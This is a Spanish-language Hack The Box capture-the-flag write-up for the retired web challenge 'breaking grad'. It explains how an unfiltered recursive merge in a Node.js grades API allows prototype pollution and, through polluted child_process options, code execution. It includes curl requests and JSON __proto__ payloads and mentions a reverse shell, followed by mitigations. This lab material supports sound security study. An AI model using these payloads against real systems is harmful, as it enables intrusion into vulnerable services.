---
challenge: breaking grad
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, nodejs, prototype-pollution, rce]
---

# breaking grad — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

API Node.js que calcula notas. Un `merge` recursivo sin filtrar claves deja **prototype pollution**; envenenando `Object.prototype` se cambia el flujo de un `child_process` y se ejecuta código.

## Enunciado

Aplicación de «calificaciones» con endpoints para crear estudiantes y calcular la media. El código fuente se entrega junto al reto.

## Análisis

En el código, la fusión de objetos no descarta `__proto__` ni `constructor`:

```js
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') merge(target[key], source[key]);
    else target[key] = source[key];
  }
}
```

Cualquier endpoint que acepte JSON anidado permite enviar:

```json
{"__proto__": {"polluted": "yes"}}
```

Comprobación:

```bash
curl -s -X POST http://<IP>:<puerto>/api/students -H 'Content-Type: application/json' \
  -d '{"name":"x","__proto__":{"polluted":"yes"}}'
curl -s http://<IP>:<puerto>/api/students | grep polluted
```

## Explotación

La ejecución llega por una llamada a `child_process` cuyas opciones se leen de un objeto contaminado (`shell`, `NODE_OPTIONS` o `env`):

```json
{"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
```

O con `env` inyectando una shell de arranque:

```json
{"__proto__": {"env": {"EVIL": "1"}, "shell": "/bin/sh", "argv0": "sh"}}
```

Al invocar el cálculo, el proceso hijo hereda el objeto envenenado y ejecuta lo que se le indique. Se usa para leer `/flag*` o lanzar una reverse shell.

## Tropiezos

- **El merge debe ser recursivo**: con `Object.assign` no hay contaminación.
- **`__proto__` bloqueado**: probar `constructor.prototype`.
- **Persistencia dentro del proceso**: si Node se reinicia por petición, el efecto se pierde; en este reto el servidor es persistente.

## Lecciones

- La contaminación de prototipos en Node es RCE cuando el proceso hijo lee sus opciones de objetos compartidos.
- `for...in` sin `Object.prototype.hasOwnProperty` es la raíz del fallo.
- Mitigación: `Object.create(null)`, `Map`, o `lodash.merge` actualizado y validación de esquema con `additionalProperties: false`.
